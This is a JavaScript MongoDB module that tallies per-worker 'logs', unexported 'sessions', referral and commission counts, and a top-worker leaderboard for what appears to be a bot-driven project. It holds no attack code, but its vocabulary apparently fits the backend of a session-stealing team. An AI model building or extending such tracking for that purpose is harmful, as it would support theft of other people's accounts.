import mongoose from "mongoose";
import User from './schemas/user.js';
import Log from "./schemas/log.js";

export default class Database {
    static async connect(url) {
        await mongoose.connect(url)
            .then(() => console.log("MongoDB подключен"));
    }

    static getUser(id) {
        return User.findOne({ id });
    }

    static createUser(id, ref, name) {
        const reg = Date.now();
        return new User({ id, ref, reg, name }).save();
    }
    static async getUserStatistic(id) {
        const user = await User.findOne({ id });
        const logs = await Log.find({ worker: user.id });
        return {
            logs: logs.length,
            todayLogs: logs.filter(x => new Date(x.created).getDate() === new Date().getDate()).length,
            monthLogs: logs.filter(x => new Date(x.created).getMonth() === new Date().getMonth()).length,
            allLogs: logs.length,
            notLoadedSessions: logs.filter(x => !x.exported).length
        };
    }
    static async getRefStatistic(id) {
        const referrals = await User.find({ ref: id });
        const logs = await Log.find({ worker: referrals.map(x => x.id), bot: 'ref' });
        const todayLogs = logs.filter(x => new Date(x.created).getDate() === new Date().getDate());
        const monthLogs = logs.filter(x => new Date(x.created).getMonth() === new Date().getMonth());
        const allLogs = logs.length;
        const notLoadedSessions = logs.filter(x => !x.exported).length;
        return {
            referrals: referrals.length,
            logs: logs.length,
            todayLogs: todayLogs.length,
            monthLogs: monthLogs.length,
            allLogs: allLogs,
            notLoadedSessions
        };
    }
    static async getStatisticProject() {
        const now = new Date();
        const moscowDate = new Date(now.toLocaleString('en-US', { timeZone: 'Europe/Moscow' }));

        const startOfDay = new Date(moscowDate);
        startOfDay.setHours(0, 0, 0, 0);

        const startOfMonth = new Date(moscowDate);
        startOfMonth.setDate(1);
        startOfMonth.setHours(0, 0, 0, 0);

        const [allLogs, monthLogs, dayLogs] = await Promise.all([
            Log.countDocuments(),
            Log.countDocuments({ created: { $gte: startOfMonth.getTime() } }),
            Log.countDocuments({ created: { $gte: startOfDay.getTime() } })
        ]);

        const [allUsers, monthUsers, dayUsers] = await Promise.all([
            User.countDocuments(),
            User.countDocuments({ reg: { $gte: startOfMonth.getTime() } }),
            User.countDocuments({ reg: { $gte: startOfDay.getTime() } })
        ]);

        const [commissionLogs, monthCommissionLogs, dayCommissionLogs] = await Promise.all([
            Log.countDocuments({ bot: "com" }),
            Log.countDocuments({ bot: "com", created: { $gte: startOfMonth.getTime() } }),
            Log.countDocuments({ bot: "com", created: { $gte: startOfDay.getTime() } })
        ]);

        const exportedLogs = await Log.countDocuments({ exported: false });

        return {
            logs: {
                all: allLogs,
                m: monthLogs,
                d: dayLogs
            },
            users: {
                all: allUsers,
                m: monthUsers,
                d: dayUsers
            },
            commissionLogs: {
                all: commissionLogs,
                m: monthCommissionLogs,
                d: dayCommissionLogs
            },
            exportedLogs
        };
    }
    static async getLogsSummary(worker) {
        const now = new Date();
        const moscowDate = new Date(now.toLocaleString('en-US', { timeZone: 'Europe/Moscow' }));

        const startOfDay = new Date(moscowDate);
        startOfDay.setHours(0, 0, 0, 0);

        const startOfMonth = new Date(moscowDate);
        startOfMonth.setDate(1);
        startOfMonth.setHours(0, 0, 0, 0);



        const [allLogs, monthLogs, dayLogs, exportedLogs] = await Promise.all([
            Log.countDocuments({
                worker,
                bot: { $ne: 'com' }
            }),
            Log.countDocuments({
                worker,
                created: { $gte: startOfMonth.getTime() },
                bot: { $ne: 'com' }
            }),
            Log.countDocuments({
                worker,
                created: { $gte: startOfDay.getTime() },
                bot: { $ne: 'com' }
            }),
            Log.countDocuments({
                worker,
                exported: false,
                bot: { $ne: 'com' }
            })
        ]);



        const dailyLogs = await Log.find({
            worker,
            created: { $gte: startOfDay.getTime() },
            bot: { $ne: 'com' }
        }).lean();


        return {
            all: allLogs,
            m: monthLogs,
            d: dayLogs,
            exported: exportedLogs
        };
    }
    static async getBotStats(bot) {
        const oneDay = 86400000;
        const oneMonth = oneDay * 30;
        const now = Date.now();

        const allLogs = await Log.countDocuments({ bot });
        const monthLogs = await Log.countDocuments({ bot, created: { $gte: now - oneMonth } });
        const dayLogs = await (async () => {
            let logs = (await Log.find({ bot }))
                .filter(x => {
                    return new Date(x.created).getDate() === new Date().getDate()
                })

            return logs.length;
        })()//await Log.countDocuments({ bot, created: { $gte: now - oneDay } });

        const exportedLogs = await Log.countDocuments({ bot, exported: false });
        return {
            all: allLogs,
            m: monthLogs,
            d: dayLogs,
            exported: exportedLogs
        };
    }
    static async getTopUsers(time) {
        const oneDay = 86400000;
        const oneMonth = oneDay * 30;
        const now = Date.now();
        const timeFilter = time !== 'all' ? {
            created: {
                $gte: time === 'day' ? now - oneDay : now - oneMonth
            }
        } : {};

        const topWorkers = await Log.aggregate([
            {
                $match: {
                    ...timeFilter,
                    worker: { $exists: true, $ne: null } // Добавляем проверку на валидность worker
                }
            },
            {
                $group: {
                    _id: '$worker',
                    logsCount: { $sum: 1 }
                }
            },
            { $sort: { logsCount: -1 } },
            { $limit: 10 }
        ]).allowDiskUse(false);

        if (!topWorkers.length) return [];

        const users = await User.find(
            {
                id: { $in: topWorkers.map(w => w._id) },
                member: true
            },
            {
                id: 1,
                name: 1,
                hiden: 1,
                _id: 0
            }
        ).lean();

        const usersMap = new Map(users.map(u => [u.id, u]));
        return topWorkers.map(worker => {
            const user = usersMap.get(worker._id);
            return {
                name: user?.name,
                hiden: user?.hiden,
                logsCount: worker.logsCount
            };
        });
    }
}
